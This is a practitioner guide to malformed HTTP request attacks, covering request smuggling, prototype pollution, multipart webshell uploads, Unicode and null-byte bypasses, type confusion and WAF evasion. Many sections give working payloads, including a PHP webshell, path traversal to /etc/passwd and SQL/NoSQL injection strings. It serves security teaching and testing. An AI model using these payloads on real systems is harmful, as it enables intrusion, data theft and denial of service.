# Malformed Requests Guide

> A practitioner reference on advanced malformed HTTP request techniques: mechanics, realistic payloads, detection gaps, and attacker objectives. Written for offensive security engineers and bug bounty hunters operating (beyond tool and assisted testing)

---

## Table of Contents

1. [What Is a Malformed Request?](#1-what-is-a-malformed-request)
2. [HTTP Request Smuggling](#2-http-request-smuggling--clte--tecl-desync)
3. [Prototype Pollution via JSON Merge](#3-prototype-pollution-via-json-merge)
4. [Multipart Boundary Collision](#4-multipart-boundary-collision)
5. [Unicode Normalization Attacks](#5-unicode-normalization-attacks)
6. [HTTP/2 Header Injection via Pseudo-Headers](#6-http2-header-injection-via-pseudo-headers)
7. [Parameter Precedence Attacks](#7-parameter-precedence-attacks)
8. [JSON Type Confusion & Schema Abuse](#8-json-type-confusion--schema-abuse)
9. [Chunked Encoding Abuse Beyond Smuggling](#9-chunked-encoding-abuse-beyond-smuggling)
10. [Null Byte & Delimiter Injection](#10-null-byte--delimiter-injection)
11. [Detection Evasion Notes](#11-detection-evasion-notes)
12. [Testing Methodology](#12-testing-methodology)
13. [References](#13-references)

---

## 1. What Is a Malformed Request?

A malformed request is an HTTP request that doesn’t match what the server expects not only because of invalid values, but also due to conflicting structure, broken encoding, unclear specifications, or different parts of the system interpreting the same request differently.

The real attack surface usually isn’t the application logic itself. It’s the gap between what the specification says should happen, what the library actually implements, how the proxy interprets the request, and what the backend finally processes.

Those gaps are often undocumented, patched inconsistently, and rarely detected by WAFs or schema validators because each individual header or field can still appear completely valid on its own.

Most security tooling looks for known payloads or recognizable patterns. Malformed requests are different because they test the assumptions between systems, and those assumptions are often what quietly remain in production.

---

## 2. HTTP Request Smuggling ( CL.TE / TE.CL Desync )

### Background

HTTP/1.1 allows two ways to declare body length: `Content-Length` (explicit byte count) and `Transfer-Encoding: chunked` (body ends at a `0\r\n` chunk). RFC 7230 says if both are present, `Transfer-Encoding` wins and `Content-Length` should be ignored. But proxies and backends don't always agree and that disagreement is the vulnerability.

### CL.TE (Frontend uses Content-Length, Backend uses Transfer-Encoding)

The frontend proxy reads 6 bytes as the body and forwards the request. The backend reads it as chunked and stops at the `0` chunk then leaves the remaining bytes (`GPOST`) in the TCP buffer, where they get prepended to the **next** incoming request.

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**Result:** The backend receives what looks like `GPOST / HTTP/1.1` as the start of the next request, poisoning it.

---

### TE.CL (Frontend uses Transfer-Encoding, Backend uses Content-Length)

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

The frontend reads the full chunked body and forwards everything. The backend reads only 3 bytes (`8\r\n`) as the body based on `Content-Length`, leaving `SMUGGLED\r\n0\r\n\r\n` in the buffer then prepended to the next request.

---

### TE.TE — Obfuscated Transfer-Encoding

When both frontend and backend support chunked encoding but one can be tricked into ignoring it:

```http
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

 Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
 : chunked
```

One component parses the header, the other doesn't recognize the obfuscated form and falls back to `Content-Length`. Desync achieved.

---

### What an Attacker Achieves

| Objective | Method |
|-----------|--------|
| Bypass front-end access controls | Smuggle a request to a restricted endpoint the proxy would normally block |
| Capture another user's request | Smuggle a partial request that causes the victim's body to be appended to attacker-controlled storage |
| Reflected XSS via request poisoning | Inject a response into a victim's browser via poisoned backend queue |
| Cache poisoning | Smuggle a request that causes the backend to cache a poisoned response |
| Account takeover | Capture session tokens or credentials from another user's request body |

---

### Detection Notes

- WAFs (Web Application Firewall) inspect individual requests. Smuggling exploits the **relationship between two requests** — no WAF catches this by default.
- Tools: Burp Suite Pro (HTTP Request Smuggler extension), `smuggler.py`
- Confirm with timing: a CL.TE payload with a long chunked body causes a delay on the legitimate request that follows.

---

## 3. Prototype Pollution via JSON Merge

### Background

In JavaScript, every object inherits from `Object.prototype`. If user-controlled JSON is merged into an object without key sanitization, an attacker can write to `__proto__` and inject properties that every subsequent object in the process inherits — without touching the auth layer.

### Payload

```http
POST /api/user/update HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "__proto__": {
    "isAdmin": true,
    "canDelete": true,
    "role": "superuser"
  }
}
```

Or via constructor:

```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

Or nested deep in a legitimate-looking payload:

```json
{
  "preferences": {
    "theme": "dark",
    "__proto__": {
      "isAdmin": true
    }
  }
}
```

---

### Vulnerable Code Pattern

```javascript
// Lodash < 4.17.12, or custom merge implementations
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key]; // __proto__ written here
    }
  }
}
```

After this runs, any new empty object `{}` will have `isAdmin: true` on its prototype chain.

---

### Escalation to RCE

Prototype pollution alone is privilege escalation. Chained with the right gadget, it becomes RCE:

**Child process gadget:**
```javascript
// If somewhere in the codebase:
const options = {};
child_process.exec(cmd, options);

// options.__proto__.shell = true allows shell injection
// Pollute: { "__proto__": { "shell": "/bin/sh", "env": { "NODE_OPTIONS": "--require /tmp/evil.js" } } }
```

**Template engine gadget (Handlebars, Pug):**
```javascript
// Pug compiles templates. If __proto__.compileDebug or __proto__.self is polluted:
// { "__proto__": { "type": "Code", "line": "process.mainModule.require('child_process').exec('id')" } }
```

---

### What an Attacker Achieves

- Privilege escalation without touching auth endpoints
- Persistent effect for the lifetime of the Node.js process (affects all users)
- RCE when gadget chains exist in the dependency tree
- Feature flag bypass, rate limit removal, or debug mode activation depending on what properties are checked downstream

---

### Detection Notes

- Schema validators (`ajv`, `joi`) catch `__proto__` only if explicitly configured to block it
- `JSON.parse()` is safe — pollution happens during object merging, not parsing
- Test with: `{"__proto__": {"polluted": "yes"}}` then `GET /api/test` and check if response contains a `polluted` property on an empty object
- Sanitize with: `Object.create(null)` as merge target, or use `lodash >= 4.17.21`

---

## 4. Multipart Boundary Collision

### Background

Multipart form data uses a boundary string to separate fields. The parser expects the boundary only as a delimiter between parts. If the boundary string appears **inside** the content of a part, the parser's behavior is implementation-defined — and implementations disagree.

### Basic Payload

```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary7MA4YWxkTrZu0gW

------Boundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

------Boundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="hidden_field"

injected_value
------Boundary7MA4YWxkTrZu0gW--
```

The boundary string appears inside the file content. A strict parser rejects it. A lenient parser splits the "file" at the inner boundary and processes what follows as a new field — meaning the attacker-controlled content after the collision is treated as a legitimate form field.

---

### Filename Extension Bypass via Boundary Smuggling

```http
Content-Type: multipart/form-data; boundary=XYZ

--XYZ
Content-Disposition: form-data; name="file"; filename="image.jpg"
Content-Type: image/jpeg

--XYZ
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
--XYZ--
```

The server validates the first `filename` (`image.jpg`) and the first `Content-Type` (`image/jpeg`). A vulnerable parser writes the second filename and content like `shell.php` with PHP content because it re-processes after the internal boundary.

---

### Content-Type Header Injection in Multipart

```
Content-Disposition: form-data; name="file"; filename="evil.php%0d%0aContent-Type: image/jpeg"
```

Some servers parse the `filename` parameter and inject it into logs or internal metadata without stripping CRLF. The injected `Content-Type` overrides the actual content type in the metadata layer.

---

### What an Attacker Achieves

- Bypass file extension whitelisting
- Upload executable files (PHP, JSP, ASPX) by disguising them as images at the validation layer
- Inject arbitrary form fields that the application processes as legitimate user input
- CRLF injection into server-side logs or response headers via filename parameter
- In worst cases: RCE via webshell upload to a web-accessible directory

---

### Detection Notes

- Most WAFs match on file extension in the `filename` parameter, boundary collision moves the actual malicious content past that check
- Test with Burp Repeater: manually craft multipart bodies and compare server responses when boundary appears in content vs. when it doesn't
- Validators that read `Content-Type` from the part header rather than inspecting magic bytes are reliably bypassable this way

---

## 5. Unicode Normalization Attacks

### Background

Unicode defines multiple representations for visually identical characters. Normalization forms (NFC, NFD, NFKC, NFKD) convert between them. When security checks happen at a different normalization stage than business logic, the same input passes the check in one form and executes in another.

### Character Substitution Examples

| Attack Character | Unicode | Normalizes To | Use Case |
|-----------------|---------|---------------|----------|
| `ｕｓｅｒ` (fullwidth) | U+FF55 U+FF53 U+FF45 U+FF52 | `user` | Route/path bypass |
| `＜script＞` | U+FF1C U+FF1E | `<script>` | XSS filter bypass |
| `ＳＥＬＥＣＴａ` | Fullwidth | `SELECTa` | SQLi WAF bypass |
| `\u2024` (one dot leader) | U+2024 | `.` | Extension check bypass |
| `\u00e9` (é) vs `e\u0301` | NFC vs NFD | Same glyph | Path traversal |

---

### Path Traversal via Normalization

```http
GET /files/..%c0%af..%c0%afetc%c0%afpasswd HTTP/1.1
```

`%c0%af` is an overlong UTF-8 encoding of `/`. Older parsers (Java, early Apache Tomcat) decode it as a slash after URL parsing, bypassing the `../` check that happens before decoding.

---

### Username Collision Attack

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "Ａdmin",
  "password": "newpassword123"
}
```

`Ａ` is fullwidth Latin capital A (U+FF21). If the application normalizes on write but not on read (or vice versa), this registers a new account that collides with `Admin` in database lookups depending on the DB collation. On MySQL with `utf8_general_ci`, this may return the `Admin` user's row when logging in as `Ａdmin`.

---

### SQLi Filter Bypass

```http
POST /api/search HTTP/1.1
Content-Type: application/json

{
  "query": "ＵＮＩＯＮａＳＥＬＥＣＴ 1,2,3--"
}
```

The WAF pattern matches on `UNION SELECT`. Fullwidth characters pass the pattern check. The database receives the query post-normalization and executes it.

---

### What an Attacker Achieves

- Bypass WAF and input validation without encoding tricks
- Path traversal to restricted files via overlong or alternative encodings
- Account collision/takeover via username normalization discrepancy
- SQLi and XSS where WAF patterns match ASCII but not Unicode equivalents
- Authorization bypass when role checks use string comparison on un-normalized input

---

## 6. HTTP/2 Header Injection via Pseudo-Headers

### Background

HTTP/2 uses binary framing and defines pseudo-headers (`:method`, `:path`, `:authority`, `:scheme`, `:status`) that must appear before regular headers and cannot be duplicated. When an HTTP/2 frontend downgrades to HTTP/1.1 for the backend, pseudo-headers are translated, and that translation is where injection surfaces.

### Pseudo-Header Injection

```
:method: GET
:path: /
:authority: target.com
:scheme: https
foo: bar\r\nHost: evil.com
```

The `\r\n` in `foo` value is invalid in HTTP/2, a compliant implementation rejects it. But some H2 libraries pass it through during downgrade translation, and the backend sees an injected `Host: evil.com` header, splitting the request.

---

### H2.CL Smuggling (HTTP/2 to HTTP/1.1 Downgrade)

```
:method: POST
:path: /
:authority: target.com
:scheme: https
content-length: 0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=1
```

The H2 frontend strips `Content-Length` (it's managed by framing in H2). The HTTP/1.1 backend receives it and reads `Content-Length: 0`  leaving the smuggled `GET /admin` request in the buffer as a prefix to the next request.

This is H2.CL, the HTTP/2 equivalent of CL.TE, and it bypasses many smuggling mitigations that were implemented for HTTP/1.1 only.

---

### H2.TE Smuggling

```
:method: POST
:path: /
:authority: target.com
transfer-encoding: chunked

0

GET /internal-api HTTP/1.1
Host: localhost
```

HTTP/2 forbids `Transfer-Encoding` headers. A vulnerable frontend passes it through anyway. The backend interprets the chunked body, reads `0\r\n\r\n` as end of body, and treats the rest as the next request targeting `localhost` endpoints unreachable from the outside.

---

### What an Attacker Achieves

- Bypass H1 smuggling mitigations that weren't extended to H2 downgrade paths
- SSRF to internal services via `Host: localhost` in smuggled requests
- Access admin panels or internal APIs exposed only on loopback
- Cache poisoning via poisoned backend response queues
- Authentication bypass when smuggled request skips the proxy's auth middleware

---

## 7. Parameter Precedence Attacks

### Background

When the same parameter appears in multiple locations (query string, body, header, cookie, path), different frameworks have different rules for which one takes precedence. That rule is almost never documented, often inconsistent across versions, and frequently exploitable.

### Query String vs. JSON Body

```http
POST /api/user/update?role=admin HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "role": "user",
  "username": "jia"
}
```

**Framework behavior:**

| Framework | Precedence |
|-----------|------------|
| Express.js (req.query vs req.body) | Separate — developer must merge manually |
| Django | Query string wins in `request.GET`, body wins in `request.POST` |
| Flask | `request.args` vs `request.form` — separate namespaces |
| PHP `$_REQUEST` | `$_GET` wins over `$_POST` by default (php.ini `variables_order`) |
| Spring (ModelAttribute) | Query string wins |

If the authorization check reads from one namespace and the business logic reads from another, the attack works.

---

### Duplicate JSON Keys

```http
POST /api/transfer HTTP/1.1
Content-Type: application/json

{
  "amount": 1,
  "account": "victim",
  "amount": 99999
}
```

RFC 7159 says duplicate keys in JSON objects produce undefined behavior. The first value passes validation, the second value gets used by business logic or vice versa, depending on the parser.

| Parser | Behavior |
|--------|----------|
| Python `json.loads` | Last value wins |
| JavaScript `JSON.parse` | Last value wins |
| Java Jackson | First value wins (by default) |
| PHP `json_decode` | Last value wins |
| Go `encoding/json` | Last value wins |

---

### Content-Type Mismatch Body Parsing

```http
POST /api/update HTTP/1.1
Content-Type: application/json

user[id]=1&user[role]=admin&user[isVerified]=true
```

Send `application/json` as the content type but a form-encoded body. Some frameworks parse the content type header, see `application/json`, fail to parse the body as JSON, and silently fall back to form parsing. The result: a form-encoded payload is processed as if it were legitimate JSON input, bypassing any JSON-specific validation.

---

### What an Attacker Achieves

- Privilege escalation by injecting a role via a parameter location the auth check ignores
- Business logic bypass (amounts, limits, flags) via duplicate keys
- WAF evasion: WAF inspects JSON body, attack lives in query string
- Schema validation bypass: validator runs on the JSON body, attacker value is in a header

---

## 8. JSON Type Confusion & Schema Abuse

### Background

Strongly typed languages enforce types at compile time. Dynamically typed languages (JavaScript, Python, PHP, Ruby) coerce types at runtime and that coercion is the attack surface.

### NoSQL Injection via Object Injection

```json
{
  "username": "admin",
  "password": { "$gt": "" }
}
```

A string comparison against `{ "$gt": "" }` in MongoDB evaluates to `true` for any non-empty string authentication bypassed. The application expected a string, received an object, and passed it directly to the query layer.

---

### Array Injection

```json
{
  "email": ["victim@target.com", "attacker@evil.com"]
}
```

If the application does `if (user.email === input.email)` and input is an array, loose equality (`==`) in PHP or JavaScript can produce unexpected results. Some ORM implementations iterate over arrays and match any element, turning a targeted lookup into a multi-user match.

---

### Integer Overflow / Float Truncation

```json
{
  "user_id": 9999999999999999999
}
```

JavaScript's `Number` type is a 64-bit float. Integers above `2^53 - 1` (9007199254740991) lose precision. A backend that stores the ID as an integer in PostgreSQL will truncate or error. A backend that stores it as a float may map it to an existing user ID due to rounding.

```json
{
  "user_id": 1.9
}
```

Some backends cast to int (becomes `1`), some reject it, some store `1.9` and a query for `1` doesn't match creating ghost records.

---

### Boolean Coercion

```json
{
  "isAdmin": "true"
}
```

In JavaScript: `"true" == true` is `false`, but `Boolean("true")` is `true`. If the backend does `if (data.isAdmin)` then any non-empty string is truthy. The string `"false"` also passes this check.

```json
{
  "isAdmin": 1
}
```

PHP and older Python code may check `if isAdmin:` , `1` is truthy, `0` is falsy. Send `1` where `false` is expected.

---

### What an Attacker Achieves

- Authentication bypass via NoSQL operator injection
- Privilege escalation via boolean/string coercion
- Integer overflow to access other users' records
- Schema validation bypass (validator enforces type, language coerces it at runtime)
- Mass assignment via sending unexpected keys that the ORM maps to database columns

---

## 9. Chunked Encoding Abuse Beyond Smuggling

### Background

Chunked transfer encoding splits a body into size-prefixed chunks. Each chunk is `{hex-size}\r\n{data}\r\n`, terminated by `0\r\n\r\n`. Parsers that handle this incorrectly expose several attack surfaces beyond classic smuggling.

### Chunk Size Overflow

```http
POST /api/data HTTP/1.1
Transfer-Encoding: chunked

FFFFFFFFFFFFFFFF
AAAAAA...
0


```

The chunk size `FFFFFFFFFFFFFFFF` is 18446744073709551615 bytes which is far more than will ever arrive. A vulnerable parser allocates a buffer of that size (integer overflow to small buffer), waits forever, or crashes (denial of service or memory exhaustion).

---

### Chunk Extension Injection

```http
POST /api/data HTTP/1.1
Transfer-Encoding: chunked

6;ext=value\r\nInjected-Header: malicious
Hello!
0


```

RFC 7230 allows chunk extensions (`size;name=value`). Most parsers ignore them. Some parsers incorrectly parse CRLF within the extension as a new header, injecting attacker-controlled headers into the parsed request.

---

### Partial Chunk with Timeout

```http
POST /api/slow HTTP/1.1
Transfer-Encoding: chunked

a
HelloWorld
```

Send a valid start of a chunked body but never send the terminating `0\r\n\r\n`. Some servers hold the connection open indefinitely waiting for the final chunk, a slow-body DoS attack that ties up worker threads without sending a large body.

---

### What an Attacker Achieves

- Denial of service via memory exhaustion (chunk size overflow)
- Header injection via chunk extension parsing bugs
- Slow-body connection exhaustion against servers with no read timeout
- WAF evasion: chunked encoding can split payloads across chunk boundaries, breaking pattern matching

---

## 10. Null Byte & Delimiter Injection

### Background

Higher-level languages handle strings as objects with explicit length. C-based internals (file system calls, some C library functions, older language runtimes) treat `\x00` as a string terminator. Injecting a null byte can truncate what the operating system or C library sees while the application layer sees the full string.

### File Extension Truncation (Legacy)

```http
POST /api/upload HTTP/1.1

filename: shell.php%00.jpg
```

The application validates `.jpg` as the extension. The file system call (in PHP < 5.3.4 or older CGI handlers) truncates at `\x00` and writes `shell.php`. The webshell is now executable.

---

### Path Truncation

```
GET /files/../../etc/passwd%00.jpg HTTP/1.1
```

The suffix `.jpg` is appended by the application to force a file extension. The null byte causes the OS file open call to ignore everything after it, reading `/etc/passwd`.

---

### SQL String Termination

```json
{
  "username": "admin\u0000' OR '1'='1"
}
```

Some database drivers or stored procedures process the string up to `\x00`. The SQL injection payload is truncated before reaching the query, but if the null byte is not sanitized and the string is stored then later read by a C-level function, the stored payload becomes active on retrieval.

---

### Header Injection via Null Byte

```http
GET /api/redirect?url=https://target.com%00%0d%0aSet-Cookie: session=evil HTTP/1.1
```

The URL validator checks for `target.com` and passes it. The null byte confuses the header writer, some implementations strip the null and process the rest, injecting the CRLF and the `Set-Cookie` header into the response.

---

### What an Attacker Achieves

- File extension bypass → webshell upload → RCE (legacy systems, PHP environments)
- Path traversal to read arbitrary files when null byte truncates appended extension
- Header injection leading to session hijacking, cache poisoning, or CSRF token leakage
- Stored payloads that activate when read by lower level components

---

## 11. Detection Evasion Notes

Standard WAF and IDS detection fails against malformed requests because:

**1. Each component is valid in isolation**
A `Content-Length` header is legitimate. A `Transfer-Encoding` header is legitimate. The attack is in how two legitimate headers interact across different parsing implementations.

**2. Payloads don't match known signatures**
Prototype pollution that uses `__proto__` is not a known SQLi or XSS pattern. Unicode fullwidth characters don't match ASCII WAF rules. Boundary collisions don't contain shellcode.

**3. Attacks operate between layers**
Request smuggling exploits the gap between the proxy and the backend. Normalization attacks exploit the gap between the validator and the database. These layers are monitored independently, never together.

**4. Volume is low**
These attacks typically require one or two carefully crafted requests, not a scanning pattern. Anomaly detection based on request rate doesn't flag them.

**Practical evasion techniques:**

```http
# Obfuscate Transfer-Encoding
Transfer-Encoding: chunked, identity
X-Transfer-Encoding: chunked

# Split payloads across chunk boundaries (breaks regex matching)
5
<?php
7
 system
8
($_GET[c
2
])
1
;
0


# Use Unicode to bypass WAF keyword matching
ＳＥＬＥＣＴa * ＦＲＯＭa users

# Inject via less-monitored parameters (headers, cookies, path)
Cookie: debug=true; __proto__[isAdmin]=true
```

---

## 12. Testing Methodology

### Recon Phase

1. Map all parameter locations: query string, body (JSON/form/multipart), headers, cookies, path segments
2. Identify the stack: proxy (Nginx, Cloudflare, AWS ALB), backend language/framework, database type
3. Note content types accepted by each endpoint
4. Check HTTP/2 support (`curl --http2 -I https://target.com`)

### Active Testing

```bash
# HTTP Request Smuggling
# Use Burp Suite HTTP Request Smuggler or:
python3 smuggler.py -u https://target.com/

# Prototype Pollution
# Manual: send __proto__ payload, then probe for polluted property
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":"exploitlab"}}'

curl https://target.com/api/debug | grep exploitlab

# Unicode Normalization
# Test each input field with fullwidth equivalents
# Python: ''.join(chr(0xFF01 + ord(c) - 0x21) for c in 'UNION SELECT')

# Multipart Boundary Collision
# Craft manually in Burp Repeater then change raw body, set Content-Type boundary manually

# Parameter Precedence
# Add role/admin/privilege params to query string while sending legitimate body
curl -X POST "https://target.com/api/update?role=admin" \
  -H "Content-Type: application/json" \
  -d '{"username":"test"}'
```

### Observation Points

When sending malformed requests, read:

- **Status codes** — 400 vs 500 tells you where the error originated (app vs infrastructure)
- **Response timing** — delays indicate the server is waiting (timeout, connection hold)
- **Error message content** — stack traces, framework names, file paths, SQL query fragments
- **Response body length differences** — same status code but different body = different code path hit
- **Headers in the response** — server version, framework headers, debug headers in error responses

---

## 13. References

- [PortSwigger Web Security Academy — HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger — HTTP/2 Downgrade Attacks](https://portswigger.net/research/http2)
- [Prototype Pollution — Olivier Arteau (2018)](https://github.com/nicehash/nicehash-calculator/issues/1)
- [Unicode Security Guide — unicode.org](https://unicode.org/reports/tr36/)
- [RFC 7230 — HTTP/1.1 Message Syntax and Routing](https://datatracker.ietf.org/doc/html/rfc7230)
- [RFC 7540 — HTTP/2](https://datatracker.ietf.org/doc/html/rfc7540)
- [James Kettle — HTTP Desync Attacks (DEF CON 27)](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [Snyk — Prototype Pollution](https://snyk.io/vuln/SNYK-JS-LODASH-450202)
- [OWASP — Testing for HTTP Parameter Pollution](https://owasp.org/www-project-web-security-testing-guide/)

---

*Exploit Lab - https://github.com/expl0itlab*  
*For educational and authorized testing purposes only.*
